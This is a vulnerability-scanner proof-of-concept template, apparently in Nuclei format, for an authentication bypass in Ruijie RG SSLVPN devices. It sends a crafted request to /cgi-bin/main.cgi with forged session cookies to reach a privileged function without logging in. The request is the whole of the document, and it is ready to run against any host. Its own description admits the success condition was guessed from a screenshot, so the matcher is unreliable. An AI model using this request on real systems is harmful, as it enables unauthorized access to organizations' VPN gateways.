id: poc-1d697e8b5d5be2dd2e42
info:
  name: 锐捷RGSSLVPN垂直越权漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: unauth,2025
http:
- raw:
  - 'GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    Pragma: no-cache

    Cache-Control: no-cache

    Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Sec-Fetch-Site: none

    Sec-Fetch-Mode: navigate

    Sec-Fetch-User: ?1

    Sec-Fetch-Dest: document

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6

    Cookie: UserName=name; SessionId=1; FirstVist=1; Skin=1; tunnel=1'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
